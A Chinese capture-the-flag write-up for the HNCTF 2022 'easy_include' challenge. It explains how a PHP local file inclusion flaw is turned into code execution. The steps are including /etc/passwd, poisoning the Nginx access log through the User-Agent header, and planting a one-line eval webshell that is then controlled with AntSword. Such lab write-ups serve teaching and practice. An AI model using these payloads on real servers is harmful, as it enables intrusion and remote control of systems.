## 基本信息

- 题目名称： [HNCTF 2022 WEEK2]easy_include
- 题目链接： https://www.nssctf.cn/problem/2948
- 考点清单： 文件包含，Nginx日志，LFI
- 工具清单： Yakit，蚁剑
- payloads： 一句话木马，LFI本地文件包含

## 一、看到什么

```php
<?php
//WEB手要懂得搜索
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

1. 网页显示了一段PHP代码，通过GET参数file实现文件包含功能，但存在过滤规则：
    - 禁止包含php、flag、data等关键字
    - 过滤特殊符号（如~、!、@、$等）

2. 代码注释提示"WEB手要懂得搜索"，暗示需通过信息收集或已知漏洞利用解题。

## 二、想到什么解题思路

1. php的`include`函数未对用户输入做严格校验，可能通过路径遍历（如`/etc/passwd`）读取敏感文件
2. 仔细查看返回的响应信息，观察是否有其他的信息泄露

## 三、尝试过程和结果记录

1. 使用Yakit中的Web Fuzzer对抓取的包进行重放，发送`GET /?file=/etc/passwd`测试LFI漏洞：
    ![alt text](<images/[HNCTF 2022 WEEK2]easy_include-passwd.jpg>)

    响应头显示服务器环境为 **`nginx/1.18.0` + `PHP/7.3.22`**。结合题目提示"WEB手要懂得搜索"，需关注 **LFI漏洞利用技巧**。

    > **漏洞本质**：  
    > 该漏洞是PHP的`include`函数未过滤用户输入导致的 **本地文件包含（LFI）**，通过污染Nginx日志实现RCE（参考：[Apache日志污染利用原理](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)）。与Nginx自身无关，PHP应用层代码缺陷是根源。

2. 尝试包含Nginx访问日志验证可行性：
    ```http
    GET /?file=/var/log/nginx/access.log
    ```
    ![alt text](<images/[HNCTF 2022 WEEK2]easy_include-access_log.jpg>)

    日志显示用户访问记录，但未包含敏感信息。需通过 **日志污染** 注入PHP代码。

3. 通过`User-Agent`字段注入PHP代码：
    ```http
    GET / HTTP/1.1
    User-Agent: <?php phpinfo(); ?>
    ```
    再次包含日志文件触发代码执行：
    ![alt text](<images/[HNCTF 2022 WEEK2]easy_include-phpinfo.jpg>)

    > **关键原理**：  
    > PHP的`include`函数会解析被包含文件中的PHP代码，**日志文件本身无执行能力**，代码执行依赖PHP的文件包含机制。

4. 写入一句话木马并连接蚁剑：
    ```http
    User-Agent: <?php eval($_POST['cmd']);?>
    ```
    ![alt text](<images/[HNCTF 2022 WEEK2]easy_include-eval.jpg>)  
    ![alt text](<images/[HNCTF 2022 WEEK2]easy_include-antsword.jpg>)

5. 在根目录获取Flag：
    ![alt text](<images/[HNCTF 2022 WEEK2]easy_include-flag.jpg>)

## 四、总结与反思

- 响应头信息（如`Server`、`X-Powered-By`）可辅助判断服务器环境，缩小攻击面。  
- 特殊场景下，"伪漏洞"（如日志解析）需结合应用层特性突破，日志路径需结合服务器类型推测（如Nginx默认`/var/log/nginx/access.log`）